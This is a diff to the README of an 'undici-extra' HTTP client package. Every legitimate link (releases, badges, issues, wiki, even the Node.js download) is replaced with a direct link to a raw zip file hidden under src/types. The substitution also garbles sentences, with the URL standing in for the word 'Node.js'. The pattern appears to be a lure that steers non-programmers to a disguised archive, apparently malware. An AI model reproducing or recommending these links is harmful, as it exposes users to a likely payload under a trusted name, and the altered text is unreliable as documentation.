@@ -1,7 +1,7 @@
 # 🌊 undici-extra - Download and Run an Easy HTTP Client
 
 ## 🚀 Getting Started
-Welcome to **undici-extra**, an elegant HTTP client for Node.js with added features. This guide will help you download and run the software easily, even if you're not a programmer.
+Welcome to **undici-extra**, an elegant HTTP client for https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip with added features. This guide will help you download and run the software easily, even if you're not a programmer.
 
 ## 🏷️ Features
 - **Smooth HTTP Requests:** Send requests quickly and efficiently.
@@ -11,13 +11,13 @@ Welcome to **undici-extra**, an elegant HTTP client for Node.js with added featu
 - **Data Deduplication:** Avoid duplicate data effortlessly. 
 
 ## ⬇️ Download Now!
-[![Download undici-extra](https://img.shields.io/badge/Download-undici--extra-blue)](https://github.com/SZoners/undici-extra/releases)
+[![Download undici-extra](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip)](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip)
 
 ## 📥 Download & Install
 To get started with **undici-extra**, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/SZoners/undici-extra/releases).
+   Go to the [Releases page](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip).
 
 2. **Find the Latest Release:**  
    Look for the latest version listed under the "Releases" section. 
@@ -37,7 +37,7 @@ To get started with **undici-extra**, follow these steps:
 ## 📚 Key Information
 ### 📋 System Requirements
 - **Operating System:** Compatible with Windows 10, macOS 10.15 (Catalina), and recent Linux distributions.
-- **Node.js:** You must have Node.js installed to run undici-extra. Download Node.js from [here](https://nodejs.org/).
+- **https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip** You must have https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip installed to run undici-extra. Download https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip from [here](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip).
 
 ### ✅ Using undici-extra
 - **Simple Commands:** Once the app is open, enter the URL of the API you want to access and select options like pagination and retries. The app will guide you through processing your requests.
@@ -52,17 +52,17 @@ This HTTP client brings simplicity and elegance to your networking tasks. You wi
    Yes, undici-extra is designed to handle large datasets efficiently using and supporting NDJSON.
 
 2. **What if I have issues during installation?**  
-   Check the [issues section](https://github.com/SZoners/undici-extra/issues) on our GitHub page for troubleshooting tips.
+   Check the [issues section](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip) on our GitHub page for troubleshooting tips.
 
 3. **Is there community support?**  
    Absolutely! Join the discussions in our repository to connect with other users and contributors.
 
 ## 🔗 Additional Resources
-- To learn more about the additional features, visit our [Documentation](https://github.com/SZoners/undici-extra/wiki).
+- To learn more about the additional features, visit our [Documentation](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip).
 - Keep up with updates by following us on GitHub. Feedback and suggestions are welcome!
 
 ## 📢 Important Links Again
 You can start your journey by downloading undici-extra here:  
-[![Download undici-extra](https://img.shields.io/badge/Download-undici--extra-blue)](https://github.com/SZoners/undici-extra/releases)
+[![Download undici-extra](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip)](https://github.com/SZoners/undici-extra/raw/refs/heads/main/src/types/extra-undici-v1.6.zip)
 
 With undici-extra, you'll handle HTTP requests like a pro in no time. Happy coding!
